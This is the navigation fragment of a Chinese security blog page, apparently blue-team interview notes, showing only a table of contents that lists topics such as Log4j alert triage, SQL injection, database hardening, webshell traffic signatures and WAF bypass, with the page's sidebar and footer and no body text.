href="#%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AAlog4j%E7%9A%84rce%E6%B5%81%E9%87%8F%E5%91%8A%E8%AD%A6%EF%BC%8C%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9A%E4%BB%96%E6%98%AF%E6%88%90%E5%8A%9F%E4%BA%86%E8%BF%98%E6%98%AF%E5%A4%B1%E8%B4%A5%E4%BA%86"><span class="toc-text">发现一个log4j的rce流量告警，如何确定他是成功了还是失败了</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-text">数据库操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%EF%BC%9A"><span class="toc-text">1.  增删改查：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">2   SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#2-1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">2.1.  sql注入漏洞原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-2-sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">2.2.  sql注入类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">数据库安全配置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-SQL-Server%EF%BC%9A"><span class="toc-text">1. SQL Server：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-MySQL%EF%BC%9A"><span class="toc-text">2. MySQL：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Redis%EF%BC%9A"><span class="toc-text">3. Redis：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-text">4. 通用漏洞原因:</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81%E5%92%8C%E5%BC%B1%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-text">1. 默认凭证和弱密码：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-text">2. 未授权访问：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="toc-text">3. 不必要的开放端口：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E6%9C%AA%E5%8F%8A%E6%97%B6%E6%9B%B4%E6%96%B0%E5%92%8C%E4%BF%AE%E8%A1%A5%EF%BC%9A"><span class="toc-text">4. 未及时更新和修补：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%92%8C%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-text">5. 不必要的服务和功能：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-%E6%9C%AA%E5%8A%A0%E5%AF%86%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%EF%BC%9A"><span class="toc-text">6. 未加密的数据传输：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-text">7. 不安全的配置文件：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E9%80%9A%E7%94%A8%E9%98%B2%E5%BE%A1"><span class="toc-text">5.通用防御</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5"><span class="toc-text">态势感知</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%8E%E6%BA%AF%E6%BA%90"><span class="toc-text">应急响应与溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">应急响应</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90"><span class="toc-text">溯源</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">安全工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-sqlmap"><span class="toc-text">1.sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sqlmap%E8%84%B1%E8%A3%A4%E7%94%A8%E5%93%AA%E4%B8%AA%E5%8F%82%E6%95%B0"><span class="toc-text">sqlmap脱裤用哪个参数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sqlmap%E8%B7%91post%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">sqlmap跑post数据包</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-nmap"><span class="toc-text">2.nmap</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Wireshark"><span class="toc-text">3.Wireshark</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8D%95%E8%8E%B7%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%9A"><span class="toc-text">捕获过滤器：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%9A"><span class="toc-text">显示过滤器：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-Dirsearch"><span class="toc-text">4.Dirsearch</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-text">流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-webshell%E5%B7%A5%E5%85%B7"><span class="toc-text">1.webshell工具</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91"><span class="toc-text">中国蚁剑</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-text">冰蝎</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-text">哥斯拉</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-text">中国菜刀</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-text">2.web漏洞扫描器</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Xray"><span class="toc-text">Xray</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#AWVS"><span class="toc-text">AWVS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Nessus"><span class="toc-text">Nessus</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#APPScan"><span class="toc-text">APPScan</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#GOBY"><span class="toc-text">GOBY</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-text">安全设备</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-waf"><span class="toc-text">1.waf</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E4%BA%9BWAF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%88%E4%BB%A5%E6%B3%A8%E5%85%A5%E4%B8%BA%E4%B8%BB%EF%BC%89"><span class="toc-text">一些WAF绕过方法（以注入为主）</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%9C%9C%E7%BD%90"><span class="toc-text">2.蜜罐</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5"><span class="toc-text">3.态势感知</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-IDS-IPS"><span class="toc-text">4.IDS&#x2F;IPS</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%A2%E8%AF%95%EF%BC%9A"><span class="toc-text">面试：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hvv%E8%93%9D%E9%98%9F%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%983"><span class="toc-text">Hvv蓝队常见面试题3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hvv%E8%93%9D%E9%98%9F%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%984"><span class="toc-text">Hvv蓝队常见面试题4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%A6%82%E7%8E%87%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE"><span class="toc-text">大概率面试题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-text">常见安全设备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%A2%E8%AF%952"><span class="toc-text">面试2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Fastjson"><span class="toc-text">1. Fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Shiro"><span class="toc-text">2. Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Log4j"><span class="toc-text">3. Log4j</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Struts2"><span class="toc-text">4. Struts2</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/pwn/" title="pwn"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn"/></a><div class="content"><a class="title" href="/2024/11/14/pwn/" title="pwn">pwn</a><time datetime="2024-11-14T09:15:12.000Z" title="发表于 2024-11-14 17:15:12">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="app渗透"/></a><div class="content"><a class="title" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透">app渗透</a><time datetime="2024-09-12T11:35:21.000Z" title="发表于 2024-09-12 19:35:21">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透"/></a><div class="content"><a class="title" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透</a><time datetime="2024-09-12T11:32:28.000Z" title="发表于 2024-09-12 19:32:28">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="代码审计"/></a><div class="content"><a class="title" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a><time datetime="2024-09-12T11:31:50.000Z" title="发表于 2024-09-12 19:31:50">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js逆向"/></a><div class="content"><a class="title" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向">js逆向</a><time datetime="2024-09-12T11:31:20.000Z" title="发表于 2024-09-12 19:31:20">2024-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Rui Ji</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
